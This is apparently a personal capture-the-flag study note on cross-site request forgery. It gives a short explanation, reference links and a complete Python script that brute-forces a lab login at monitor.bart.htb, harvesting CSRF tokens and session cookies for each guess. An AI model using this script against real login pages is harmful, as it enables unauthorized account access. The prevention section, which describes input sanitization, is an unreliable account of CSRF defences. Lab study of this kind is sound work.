---
tags:
  - Enumeration
  - TCP
  - HTTP
  - Concepts
  - Vulnerabilities
---

A Cross-Site Request Forgery (XSRF) is also known as “one-click attack” and “session riding”. The idea is that an attacker can craft a URL such that when a target visits it, some actions or commands are taken that the user may not have wanted to take. For a site that’s vulnerable to XSRF, this can be a nasty attack, since the attacker can control the text of the link they send the target, making it not too hard to trick people into clicking on links.

`CSRF` attacks may utilize [[Cross Site Scripting (XSS)]] vulnerabilities to perform certain queries, and `API` calls on a web application that the victim is currently authenticated to. This would allow the attacker to perform actions as the authenticated user. It may also utilize other vulnerabilities to perform the same functions, like utilizing HTTP parameters for attacks.

# Guide 

[Cross-Site Request Forgery Prevention - OWASP Cheat Sheet Series](https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html)
# Walkthrough

[HTB: SecNotes | 0xdf hacks stuff](https://0xdf.gitlab.io/2019/01/19/htb-secnotes.html)

## Prevention

Though there should be measures on the back end to detect and filter user input, it is also always important to filter and sanitize user input on the front end before it reaches the back end, and especially if this code may be displayed directly on the client-side without communicating with the back end. Two main controls must be applied when accepting user input:

|Type|Description|
|---|---|
|`Sanitization`|Removing special characters and non-standard characters from user input before displaying it or storing it.|
|`Validation`|Ensuring that submitted user input matches the expected format (i.e., submitted email matched email format)|

# Bypass

1. [[Burp]] can be used to bypass CRSF
2. Manual script:

```
#!/usr/bin/env python3

import re
import requests
import sys
from multiprocessing import Pool


MAX_PROC = 50
url = "http://monitor.bart.htb/"
username = "harvey"

#<input type="hidden" name="csrf" value="aab59572a210c4ee1f19ab55555a5d829e78b8efdbecd4b2f68bd485d82f0a57" />
csrf_pattern = re.compile('name="csrf" value="(\w+)" /')

def usage():
    print("{} [wordlist]".format(sys.argv[0]))
    print("  wordlist should be one word per line]")
    sys.exit(1)

def check_password(password):

    # get csrf token and PHPSESSID
    r = requests.get(url)
    csrf = re.search(csrf_pattern, r.text).group(1)
    PHPSESSID = [x.split('=')[1] for x in r.headers['Set-Cookie'].split(';') if x.split('=')[0] == 'PHPSESSID'][0]

    # try login:
    data = {"csrf": csrf,
            "user_name": username,
            "user_password": password,
            "action": "login"}
    proxies = {'http': 'http://127.0.0.1:8080'}
    headers = {'Cookie': "PHPSESSID={}".format(PHPSESSID)}
    r = requests.post(url, data=data, proxies=proxies, headers=headers)

    if '<p>The information is incorrect.</p>' in r.text:
        return password, False
    else:
        return password, True


def main(wordlist, nprocs=MAX_PROC):
    with open(wordlist, 'r', encoding='latin-1') as f:
       words = f.read().rstrip().replace('\r','').split('\n')

    words = [x.lower() for x in words] + [x.capitalize() for x in words] + words + [x.upper() for x in words]

    pool = Pool(processes=nprocs)

    i = 0
    print_status(0, len(words))
    for password, status in pool.imap_unordered(check_password, [pass_ for pass_ in words]):
        if status:
            sys.stdout.write("\n[+] Found password: {} \n".format(password))
            pool.terminate()
            sys.exit(0)
        else:
            i += 1
            print_status(i, len(words))

    print("\n\nPassword not found\n")

def print_status(i, l, max=30):
    sys.stdout.write("\r|{}>{}|  {:>15}/{}".format( "=" * ((i*max)//l), " " * (max - ((i*max)//l)), i, l))

if __name__ == '__main__':
    if len(sys.argv) != 2:
        usage()
    main(sys.argv[1])

```
